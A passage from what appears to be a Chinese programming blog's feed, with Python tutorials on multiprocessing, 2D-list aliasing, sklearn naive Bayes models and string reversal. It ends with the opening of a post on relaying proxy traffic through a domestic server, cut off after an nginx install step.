<p>使用<code>Process()</code>创建子进程实例，之后使用实例的<code>start()</code>方法开始启动子进程</p>
<p><strong>示例代码：</strong></p>
<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#子进程要执行的代码</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_proc</span><span class="hljs-params">(name)</span>:</span></span><br><span class="line">	print(<span class="hljs-string">'Run child process %s (%s).'</span> % (name,os.getpid()))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">	print(<span class="hljs-string">'Parent process %s.'</span> % os.getpid())</span><br><span class="line">	<span class="hljs-comment">#创建子进程</span></span><br><span class="line">	p = Process(target=run_proc, args=(<span class="hljs-string">'test'</span>,))</span><br><span class="line">	print(<span class="hljs-string">'Child process will start'</span>)</span><br><span class="line">	<span class="hljs-comment">#开始启动子进程</span></span><br><span class="line">	p.start()</span><br><span class="line">	<span class="hljs-comment">#join()方法可以等待子进程结束后再继续往下运行，通常用于进程间的同步</span></span><br><span class="line">	p.join()</span><br><span class="line">	print(<span class="hljs-string">'Child process end.'</span>)</span><br></pre></td></tr></table></figure></p>
<p><strong>执行结果：</strong></p>
<p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">Parent process 62629.</span><br><span class="line">Child process will start</span><br><span class="line">Run child process test (62630).</span><br><span class="line">Child process end.</span><br></pre></td></tr></table></figure></p>
<ul>
<li><h5 id="Pool"><a href="#Pool" class="headerlink" title="Pool"></a>Pool</h5></li>
</ul>
<p>如果要启用大量子进程，可以使用进程池<code>Pool</code></p>
<p><strong>示例代码：</strong></p>
<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool</span><br><span class="line"><span class="hljs-keyword">import</span> os,time,random</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">long_time_task</span><span class="hljs-params">(name)</span>:</span></span><br><span class="line">	print(<span class="hljs-string">'Run task %s (%s)...'</span> % (name,os.getpid()))</span><br><span class="line">	start = time.time()</span><br><span class="line">	<span class="hljs-comment">#random()随机产生0～1之间的数</span></span><br><span class="line">	time.sleep(random.random()*<span class="hljs-number">3</span>)</span><br><span class="line">	end = time.time()</span><br><span class="line">	print(<span class="hljs-string">'Task %s runs %.2f seconds.'</span> % (name,(end-start)))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">	print(<span class="hljs-string">'Parent process %s.'</span> % os.getpid())</span><br><span class="line">	<span class="hljs-comment">#限制同时运行4个子进程</span></span><br><span class="line">	p = Pool(<span class="hljs-number">4</span>)</span><br><span class="line">	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):</span><br><span class="line">		p.apply_async(long_time_task,args=(i,))</span><br><span class="line">	print(<span class="hljs-string">'Waiting for all subprocesses done'</span>)</span><br><span class="line">	<span class="hljs-comment">#调用join()之前必须先调用close(),之后不能继续添加新的Process了</span></span><br><span class="line">	p.close()</span><br><span class="line">	<span class="hljs-comment">#等待所有子进程执行完毕</span></span><br><span class="line">	p.join()</span><br><span class="line">	print(<span class="hljs-string">'All subprocesses done.'</span>)</span><br></pre></td></tr></table></figure></p>
<p><strong>执行结果：</strong></p>
<p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">Parent process 63187.</span><br><span class="line">Waiting for all subprocesses done</span><br><span class="line">Run task 1 (63189)...</span><br><span class="line">Run task 2 (63190)...</span><br><span class="line">Run task 3 (63191)...</span><br><span class="line">Run task 0 (63188)...</span><br><span class="line">Task 3 runs 0.15 seconds.</span><br><span class="line">Run task 4 (63191)...</span><br><span class="line">Task 2 runs 0.96 seconds.</span><br><span class="line">Task 1 runs 1.18 seconds.</span><br><span class="line">Task 0 runs 1.72 seconds.</span><br><span class="line">Task 4 runs 2.17 seconds.</span><br><span class="line">All subprocesses done.</span><br></pre></td></tr></table></figure></p>
<p>可以通过执行结果看到，定义<code>Pool(4)</code>之后只能同时执行4个进程。</p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>Python中如何定义二维数组</title>
    <url>/2019/11/17/py-cre-douarr/</url>
    <content><![CDATA[<p>小知识点随手记录…<a id="more"></a></p>
<h3 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h3><p>或许你会说用numpy中的数组不就可以了，想定义几维就几维，没错numpy确实方便很多。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> numpy</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = numpy.zeros((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>],</span><br><span class="line">       [<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>]])</span><br></pre></td></tr></table></figure><br>但如果不用numpy呢？</p>
<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>有人会说可以定义一个二维列表代替二维数组呗。</p>
<h4 id="1-错误方式"><a href="#1-错误方式" class="headerlink" title="1. 错误方式"></a>1. 错误方式</h4><p>一开始一定会有人这样定义<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>看是不是成功了，但当我们修改其中的某个值的时候，就会发现奇怪的地方<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>特么的怎么连<code>a[1][0]</code>也跟着变成1了，因为上面的定义方式等价于：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list = [<span class="hljs-number">0</span>] * <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [temp_list, temp_list]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list</span><br><span class="line">[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>所以这么用list定义二维数组的方法是错的，那么正确的方式应该怎么做呢？</p>
<h4 id="2-正确方式"><a href="#2-正确方式" class="headerlink" title="2. 正确方式"></a>2. 正确方式</h4><p>我们可以用for来定义二维数组。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra = [ [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>)]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>可以看到这样做就没有上面的错误出现了。</p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>朴素贝叶斯的三个常用模型</title>
    <url>/2019/10/14/navie-bayes/</url>
    <content><![CDATA[<p>高斯、多项式、伯努利<a id="more"></a></p>
<h3 id="朴素贝叶斯（naive-bayes）"><a href="#朴素贝叶斯（naive-bayes）" class="headerlink" title="朴素贝叶斯（naive_bayes）"></a>朴素贝叶斯（naive_bayes）</h3><p>若一个样本有n个特征，分别用$x_{1},x_{2},…,x_{n}$表示，将其划分到类yk的可能性$P(y_{k}|x_{1},x_{2},…,x_{n})$为：<br>$P(y_{k}|x_{1},x_{2},…,x_{n}) = P(y_{k})\prod_{i=1}^{n}P(x_{i}|y_{k})$</p>
<p>上式中等号右侧的各个值可以通过训练得到。根据上面的公式可以求的某个数据属于各个分类的可能性（这些可能性之和不一定是1），该数据应该属于具有最大可能性的分类中。<br>一般来说，如果一个样本没有特征xi，那么P(xi|yk)将不参与计算。不过下面的伯努利模型除外。</p>
<p>以上是朴素贝叶斯的最基本的内容。</p>
<hr>
<h3 id="高斯模型（GaussianNB）"><a href="#高斯模型（GaussianNB）" class="headerlink" title="高斯模型（GaussianNB）"></a>高斯模型（GaussianNB）</h3><p>有些特征可能是连续型变量，比如说人的身高，物体的长度，这些特征可以转换成离散型的值，比如如果身高在160cm以下，特征值为1；在160cm和170cm之间，特征值为2；在170cm之上，特征值为3。也可以这样转换，将身高转换为3个特征，分别是f1、f2、f3，如果身高是160cm以下，这三个特征的值分别是1、0、0，若身高在170cm之上，这三个特征的值分别是0、0、1。不过这些方式都不够细腻，高斯模型可以解决这个问题。高斯模型假设这些一个特征的所有属于某个类别的观测值符合高斯分布，也就是<br>$P(x_{i}|y_{k}) = \frac{1}{\sqrt{2\pi\sigma_{y_{k}}^{2}}}exp( -\frac{(x_{i}-\mu_{y_{k}})^2}  {2\sigma_{y_{k}}^{2}}   )$</p>
<h4 id="sklearn实例："><a href="#sklearn实例：" class="headerlink" title="sklearn实例："></a>sklearn实例：</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> datasets</span><br><span class="line"><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> GaussianNB</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line"><span class="hljs-comment">#四个特征的名字</span></span><br><span class="line">print(iris.feature_names) </span><br><span class="line">clf = GaussianNB()</span><br><span class="line">clf.fit(iris.data,iris.target)</span><br><span class="line"><span class="hljs-comment">#第0个数据的标签及其预测</span></span><br><span class="line">print(iris.target[<span class="hljs-number">0</span>])</span><br><span class="line">print(clf.predict(iris.data[<span class="hljs-number">0</span>].reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>)))</span><br><span class="line"><span class="hljs-comment">#第149个数据的标签及其预测</span></span><br><span class="line">print(iris.target[<span class="hljs-number">149</span>])</span><br><span class="line">print(clf.predict(iris.data[<span class="hljs-number">149</span>].reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>)))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">[<span class="hljs-string">'sepal length (cm)'</span>, <span class="hljs-string">'sepal width (cm)'</span>, <span class="hljs-string">'petal length (cm)'</span>, <span class="hljs-string">'petal width (cm)'</span>]</span><br><span class="line">0</span><br><span class="line">[0]</span><br><span class="line">2</span><br><span class="line">[2]</span><br><span class="line">[Finished <span class="hljs-keyword">in</span> 0.9s]</span><br></pre></td></tr></table></figure></p>
<hr>
<h3 id="多项式模型（MultinomialNB）"><a href="#多项式模型（MultinomialNB）" class="headerlink" title="多项式模型（MultinomialNB）"></a>多项式模型（MultinomialNB）</h3><p>该模型常用于文本分类，特征是单词，值是单词的出现次数。<br>$P(x_{i}|y_{k}) = \frac{N_{y_{k}x_{i}}+\alpha}{N_{y_{k}}+\alpha n}$<br>其中，$N_{y_{k}x_{i}}$是类别$y_{k}$下特征$x_{i}$出现的次数；$N_{y_{k}}$是类别$y_{k}$下所有特征出现的总次数。对应到文本分类里，如果单词<code>word</code>在一篇分类为<code>label1</code>的文档中出现了5次，那么$N_{label1,word}$的值会增加5。如果是去除了重复单词的，那么$N_{label1,word}$的值会增加1。$n$是特征的数量，在文本分类中就是去重后的所有单词的数量。$α$的取值范围是[0,1]，比较常见的是取值为1。</p>
<p>待预测样本中的特征xi在训练时可能没有出现，如果没有出现，则$N_{ykxi}$值为0，如果直接拿来计算该样本属于某个分类的概率，结果都将是0。在分子中加入$α$，在分母中加入$αn$可以解决这个问题。</p>
<h4 id="sklearn实例：-1"><a href="#sklearn实例：-1" class="headerlink" title="sklearn实例："></a>sklearn实例：</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> MultinomialNB</span><br><span class="line"><span class="hljs-comment">#随机生成6*100个小于5大于等于0的数</span></span><br><span class="line">X = np.random.randint(<span class="hljs-number">5</span>, size=(<span class="hljs-number">6</span>,<span class="hljs-number">100</span>))</span><br><span class="line">Y = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>])</span><br><span class="line">clf = MultinomialNB()</span><br><span class="line">clf.fit(X, Y)</span><br><span class="line">print(clf.predict(X[<span class="hljs-number">2</span>].reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>)))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">[3]</span><br><span class="line">[Finished <span class="hljs-keyword">in</span> 0.5s]</span><br></pre></td></tr></table></figure></p>
<p><strong><em>Tips</em></strong>: 多项式模型在训练一个数据集结束后可以继续训练其他数据集而无需将两个数据集放在一起进行训练。在sklearn中，MultinomialNB()类的partial_fit()方法可以进行这种训练。这种方式特别适合于训练集大到内存无法一次性放入的情况。</p>
<p>在第一次调用<code>partial_fit()</code>时需要给出所有的分类标号。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> MultinomialNB</span><br><span class="line">clf = MultinomialNB()</span><br><span class="line"><span class="hljs-comment">#在第一次调用时需要给出所有的分类标号</span></span><br><span class="line">clf.partial_fit(np.array([<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]).reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>), np.array([<span class="hljs-string">'aa'</span>]), [<span class="hljs-string">'aa'</span>,<span class="hljs-string">'bb'</span>])</span><br><span class="line">clf.partial_fit(np.array([<span class="hljs-number">6</span>,<span class="hljs-number">1</span>]).reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>), np.array([<span class="hljs-string">'bb'</span>]))</span><br><span class="line"></span><br><span class="line">print(clf.predict(np.array([<span class="hljs-number">9</span>,<span class="hljs-number">1</span>]).reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>)))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">[<span class="hljs-string">'bb'</span>]</span><br><span class="line">[Finished <span class="hljs-keyword">in</span> 0.5s]</span><br></pre></td></tr></table></figure></p>
<hr>
<h3 id="伯努利模型"><a href="#伯努利模型" class="headerlink" title="伯努利模型"></a>伯努利模型</h3><p>在伯努利模型中，对于一个样本来说，其特征用的是全局的特征。每个特征的取值是布尔型的，也就是true和false，或者1和0。在文本分类中，就是一个特征有没有在一个文档中出现。</p>
<p>如果特征值$x_{i}$为1，那么<br>$P(x_{i}|y_{k}) = P(x_{i}=1|y_{k})$<br>如果特征值$x_{i}$为0，那么<br>$P(x_{i}|y_{k}) = 1-P(x_{i}=1|y_{k})$</p>
<p>这意味着，“没有某个特征”也是一个特征。</p>
<h4 id="sklearn实例：-2"><a href="#sklearn实例：-2" class="headerlink" title="sklearn实例："></a>sklearn实例：</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> BernoulliNB</span><br><span class="line">X = np.random.randint(<span class="hljs-number">2</span>, size=(<span class="hljs-number">6</span>, <span class="hljs-number">100</span>))</span><br><span class="line">Y = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])</span><br><span class="line">clf = BernoulliNB()</span><br><span class="line">clf.fit(X, Y)</span><br><span class="line">print(clf.predict(X[<span class="hljs-number">2</span>].reshape(<span class="hljs-number">1</span>, <span class="hljs-number">-1</span>)))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">[3]</span><br><span class="line">[Finished <span class="hljs-keyword">in</span> 1.0s]</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>Python实现字符串反转的几种方法</title>
    <url>/2019/11/15/py-str-reverse/</url>
    <content><![CDATA[<p>你能想到几种？<a id="more"></a></p>
<h3 id="1-使用字符串切片"><a href="#1-使用字符串切片" class="headerlink" title="1. 使用字符串切片"></a>1. 使用字符串切片</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = s[::<span class="hljs-number">-1</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2-使用列表的reverse方法"><a href="#2-使用列表的reverse方法" class="headerlink" title="2. 使用列表的reverse方法"></a>2. 使用列表的reverse方法</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'g'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'a'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>同理，可以用<code>&#39;&#39;.join(l[::-1])</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = list(s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'f'</span>, <span class="hljs-string">'g'</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = <span class="hljs-string">''</span>.join(l[::<span class="hljs-number">-1</span>])</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="3-使用reduce"><a href="#3-使用reduce" class="headerlink" title="3. 使用reduce"></a>3. 使用reduce</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans = reduce(<span class="hljs-keyword">lambda</span> x,y:y+x, s)</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="hljs-string">'gfedcba'</span></span><br></pre></td></tr></table></figure><br>在这里简单复习一下reduce<br>使用<code>reduce</code>需要先<code>from functools import reduce</code><br><code>reduce</code>有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数<code>lambda</code>，作用是输入x和y返回y+x，可迭代对象是字符串<code>&#39;abcdefg&#39;</code>。<br>具体过程是<code>x = &#39;a&#39;, y = &#39;b&#39;</code>返回<code>&#39;ba&#39;</code>，之后<code>&#39;x = &#39;ba&#39;, y = c</code>返回<code>&#39;cba&#39;</code>这样迭代完整个字符串就可以达到反转字符串的效果。</p>
<h3 id="4-使用递归函数"><a href="#4-使用递归函数" class="headerlink" title="4. 使用递归函数"></a>4. 使用递归函数</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-keyword">if</span> len(s) == <span class="hljs-number">1</span>:</span><br><span class="line">		<span class="hljs-keyword">return</span> s</span><br><span class="line">	<span class="hljs-keyword">return</span> func(s[<span class="hljs-number">1</span>:]) + s[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
<h3 id="5-使用栈"><a href="#5-使用栈" class="headerlink" title="5. 使用栈"></a>5. 使用栈</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	<span class="hljs-comment">#模拟全部字符入栈</span></span><br><span class="line">	l = list(s)</span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	<span class="hljs-keyword">while</span> len(l)&gt;<span class="hljs-number">0</span>:</span><br><span class="line">		<span class="hljs-comment">#模拟出栈</span></span><br><span class="line">		ans += l.pop()</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure></p>
<h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">	ans = <span class="hljs-string">''</span></span><br><span class="line">	max_index = len(s) - <span class="hljs-number">1</span></span><br><span class="line">	<span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(s):</span><br><span class="line">		ans += s[max_index-index]</span><br><span class="line">	<span class="hljs-keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure><br>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>l = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> index, value <span class="hljs-keyword">in</span> enumerate(l):</span><br><span class="line"><span class="hljs-meta">... </span>    print(<span class="hljs-string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-number">2</span>, <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-number">3</span>, <span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-number">4</span>, <span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-number">5</span>, <span class="hljs-number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p>
<hr>
<p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>通过国内服务器转发流量科学上网</title>
    <url>/2020/02/04/network-jump/</url>
    <content><![CDATA[<p>从除夕那天开始，我的代理服务器就被GFW墙掉了，前些天重新搭了一个，先是被封端口，过了几天ip又被墙掉了，为了解决这个问题，因此有了这篇文章。<a id="more"></a><br>具体方法借鉴于该篇文章：<a href="https://www.hijk.pw/forward-traffic-via-internal-vps/" target="_blank" rel="noopener">Click Here</a><br>如果您不愿多点击一次链接，就请继续往下看，本文对于上述博文稍作整理。<br>完成此博文所介绍的方法的基本条件：</p>
<ul>
<li>一台国内服务器，如阿里云腾讯云等，我这里以阿里云为例，系统为Ubuntu 16.04。</li>
<li>一台用于代理的服务器，我这里以Digitalocean为例，系统为Ubuntu 18.04.</li>
</ul>
<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>通过国内服务器转发流量看起来是多此一举，从“国内-&gt;境外VPS“变成了”国内-&gt;国内服务器-&gt;境外VPS“，但国内大厂的服务器出入境走的都是高级路线，国内服务器与我们的延迟大概在50ms以内，这样算起来延迟是降低了。<br><img src="/2020/02/04/network-jump/3.jpg" alt="左边为自己网络ping境外VPS和阿里云，右边为阿里云ping境外VPS"><br>从上图我们可以明显看到右边加上ping阿里云的延迟明显要比直接ping境外vps的延迟要小很多。<br>该方法属于<code>硬件加速</code>，代价是要多出额外的成本租一台国内服务器，优点是更稳定，可以有效防止境外IP或者端口被封。<br>而国内服务器在这里充当的作用就是流量转发。<br>该方法共分为三个步骤：</p>
<ul>
<li>国内服务器配置流量转发程序</li>
<li>境外VPS配置代理程序</li>
<li>自己的机器配置代理至国内服务器</li>
</ul>
<p>还可以在境外的VPS上配置一些web页面，只对外开放80/443端口，其他端口对你的国内服务器的IP地址开放，这样当GFW扫描的时候也只是觉得这是一个网站而已。</p>
<h3 id="二、国内服务器配置流量转发程序"><a href="#二、国内服务器配置流量转发程序" class="headerlink" title="二、国内服务器配置流量转发程序"></a>二、国内服务器配置流量转发程序</h3><p>这里用到nginx来配置流量转发</p>
<h4 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></p>
